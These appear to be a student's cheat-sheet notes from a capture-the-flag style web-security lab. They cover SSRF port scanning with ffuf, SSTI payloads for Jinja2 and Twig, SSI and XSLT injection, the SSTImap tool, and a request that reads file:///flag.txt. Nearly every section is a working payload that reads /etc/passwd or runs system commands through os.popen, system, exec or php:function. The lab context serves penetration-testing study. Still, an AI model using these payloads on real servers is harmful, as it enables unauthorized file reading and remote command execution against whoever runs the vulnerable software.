
# Exploiting SSRF

Exploit a SSRF vulnerability to identify an internal web application. Access the internal application to obtain the flag. 

```bash

seq 1 10000 > ports.txt

ffuf -w ./ports.txt -u http://10.129.201.127/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" -fr "Failed to connect to"



```

#


```bash
ffuf -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://dateserver.htb/FUZZ.php&date=2024-01-01" -fr "Server at dateserver.htb Port 80"


```

# Blind SSRF

```bash

ffuf -w ./ports.txt -u http://10.129.81.203/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" -fr "Something went wrong"


```

# 

```bash
{{7*7}}
tiwg


```

# Exploiting SSTI - Jinja2

```bash

{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}

{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}


```

# Exploiting SSTI - Twig

```bash

{{ _self }}


{{ "/etc/passwd"|file_excerpt(1,-1) }}


{{ ['id'] | filter('system') }}


```

# SSTI Tools of the Trade & Preventing SSTI

```bash

git clone https://github.com/vladko312/SSTImap
cd SSTImap
pip3 install -r requirements.txt
python3 sstimap.py 

python3 sstimap.py -u http://172.17.0.2/index.php?name=test

```

# Exploiting SSI Injection

```bash

<!--#printenv -->

<!--#exec cmd="id" -->


``` 

# Exploiting XSLT Injection

```bash

<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')" />


<xsl:value-of select="php:function('file_get_contents','/etc/passwd')" />


<xsl:value-of select="php:function('system','id')" />


```

# Skill 

```bash
POST / HTTP/1.1
Host: 94.237.59.63:31313
Content-Length: 20
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: http://94.237.59.63:31313
Referer: http://94.237.59.63:31313/index.php
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: keep-alive

api=file:///flag.txt

```